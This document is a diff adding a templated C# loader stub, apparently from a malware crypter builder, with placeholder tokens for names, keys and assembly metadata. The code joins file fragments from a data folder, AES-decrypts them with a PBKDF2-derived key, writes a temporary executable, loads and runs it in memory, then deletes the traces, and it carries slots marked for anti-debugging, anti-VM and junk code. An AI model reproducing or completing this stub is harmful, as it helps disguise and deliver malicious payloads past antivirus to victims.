@@ -1,0 +1,190 @@
+using System;
+using System.IO;
+using System.Linq;
+using System.Reflection;
+using System.Threading;
+using System.Windows.Forms;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Security.Cryptography;
+using System.Timers;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Data;
+using System.Management;
+using Microsoft.Win32;
+
+[assembly: AssemblyTitle("%title%")]
+[assembly: AssemblyDescription("%description%")]
+[assembly: AssemblyCompany("%company%")]
+[assembly: AssemblyProduct("%product%")]
+[assembly: AssemblyCopyright("%copyright%")]
+
+[assembly: ComVisible(false)]
+
+[assembly: Guid("%guid%")]
+
+[assembly: AssemblyVersion("%version%")]
+[assembly: AssemblyFileVersion("%version%")]
+
+namespace %NAMESPACE%{
+		//JUNKZ
+	public class %CLASS%{
+	public string %KEY2% = @"%KEY%";
+	public string %DIRL% = "";
+	public string %EXEC% = "/" + "%EXECNAME%" + ".tmp";
+	public string %TMP% = "/" + "%TMP2%" + ".tmp";
+	public string %DATA% = "%DATAFOLDER%";
+	
+	static void Main(){
+			//ANTIDEBUG2
+			%CLASS% %ENTRYSTARTER% = new %CLASS%();
+			%ENTRYSTARTER%.%ENTRYPOINT%();
+			//ANTIVM2
+			}
+			
+			
+			public static void %LOADFILE%(byte[] %LB%)
+        {
+          
+            try {
+                Assembly %A% = Assembly.Load(%LB%);
+			   object[] %ARG% = new Object[] { new String[] { "a", "z", "c", "d" } };
+               
+               %A%.EntryPoint.Invoke(null, %ARG%);
+                
+            }
+            catch
+            {
+			try{
+			   Assembly %A% = Assembly.Load(%LB%);
+              
+               %A%.EntryPoint.Invoke(null, null);
+			}catch(Exception %EX%){
+			 MessageBox.Show("Error occured:\n" + %EX%.InnerException);
+			}
+                
+            }
+           
+        }
+		 private static byte[] %COMBINE%(params byte[][] %ARZ%)
+        {
+            byte[] %RV% = new byte[%ARZ%.Sum(a => a.Length)];
+            int %OFF% = 0;
+            foreach (byte[] %...% in %ARZ%)
+            {
+                System.Buffer.BlockCopy(%...%, 0, %RV%, %OFF%, %...%.Length);
+                %OFF% += %...%.Length;
+            }
+            return %RV%;
+        }
+
+			public void %ENTRYPOINT%(){
+			%DIRL% = Directory.GetCurrentDirectory() + "/" + %DATA% + "/";
+			
+			DirectoryInfo %DI% = new DirectoryInfo(%DIRL%);
+			 FileInfo[] %FILES% = %DI%.GetFiles();
+			   byte[] %BYT% = new byte[0];
+
+			    foreach(FileInfo %FILE% in %FILES%)
+            {
+                byte[] %TMPB% = File.ReadAllBytes(%FILE%.FullName);
+                if(%TMPB%[0] == 0x2a && %TMPB%[1] == 0x31 && %TMPB%[2] == 0x5a)
+                {
+
+                }
+                else
+                {
+                    %BYT% = %COMBINE%(%BYT%, %TMPB%);
+                } 
+            }
+			   File.WriteAllBytes(Directory.GetCurrentDirectory() + %TMP%, %BYT%);
+			    %CRYPTCLASS%.%DECRYPT%(%KEY2%, Directory.GetCurrentDirectory() + %TMP%, Directory.GetCurrentDirectory() + %EXEC%);
+				  byte[] %INJ% = File.ReadAllBytes(Directory.GetCurrentDirectory() + %EXEC%);
+				   Thread.Sleep(100);
+            File.Delete(Directory.GetCurrentDirectory() + %TMP%);
+			 Thread %thrd% = new Thread(() => %LOADFILE%(%INJ%));
+            %thrd%.TrySetApartmentState(ApartmentState.STA);
+            %thrd%.Start();
+           Thread.Sleep(100);
+			 File.Delete(Directory.GetCurrentDirectory() + %EXEC%);
+			
+			}
+		}
+		//ANTIDEBUG3
+		//ANTI_
+		    public class %CRYPTCLASS%
+    {
+       
+
+        public static void %DECRYPT%(string %PASS%, string %in23%, string %out23%)
+        {
+            %CRYPTING%(%PASS%, %in23%, %out23%);
+        }
+        public static void %CRYPTING%(string %PASS%, string %inX%, string %outX%)
+        {
+
+            using (FileStream %inXs% = new FileStream(%inX%, FileMode.Open, FileAccess.Read))
+            {
+                using (FileStream %outXs% = new FileStream(%outX%, FileMode.Create, FileAccess.Write))
+                {
+
+                    %STREAM%(%PASS%, %inXs%, %outXs%);
+                }
+            }
+        }
+
+        public static void %STREAM%(string %PASS%, Stream %ins%, Stream %outs%)
+        {
+            AesCryptoServiceProvider %AES% = new AesCryptoServiceProvider();
+			int %asd2% = 1024;
+            int %keysize% = 0;
+		    int %asd3% = 1;
+            for (int %i.% = %asd2%; %i.% > %asd3%; %i.%--)
+            {
+                if (%AES%.ValidKeySize(%i.%))
+                {
+                    %keysize% = %i.%;
+                    break;
+                }
+            }
+            int %blockz% = %AES%.BlockSize;
+            byte[] %key.% = null;
+            byte[] %i.v% = null;
+            byte[] %sa.lt% = null;
+            %i.v% = Encoding.ASCII.GetBytes(@"%IV%");
+            %sa.lt% = Encoding.ASCII.GetBytes(@"%SALT%");
+            %MAKE%(%PASS%, %sa.lt%, %keysize%, %blockz%, out %key.%, out %i.v%);
+            ICryptoTransform %crypto%;
+            %crypto% = %AES%.CreateDecryptor(%key.%, %i.v%);
+            try
+            {
+                using (CryptoStream %cryptos% = new CryptoStream(%outs%, %crypto%, CryptoStreamMode.Write))
+                {
+					int %asd% = 0;
+                    const int %block2% = 1024;
+                    byte[] %buff..% = new byte[%block2%];
+                    int %_B%;
+                    while (true)
+                    {
+                        %_B% = %ins%.Read(%buff..%, %asd%, %blockz%);
+                        if (%_B% == %asd%) break;
+                        %cryptos%.Write(%buff..%, %asd%, %_B%);
+                    }
+                }
+            }
+            catch
+            {
+            }
+            %crypto%.Dispose();
+        }
+
+        private static void %MAKE%(string %PASS%, byte[] %sa.lt%, int %key32%, int %block32%, out byte[] %key.%, out byte[] %i.v%)
+        {
+            Rfc2898DeriveBytes %b32% = new Rfc2898DeriveBytes(%PASS%, %sa.lt%, 1000);
+            %key.% = %b32%.GetBytes(%key32% / 8);
+            %i.v% = %b32%.GetBytes(%block32% / 8);
+        }
+    }
+}
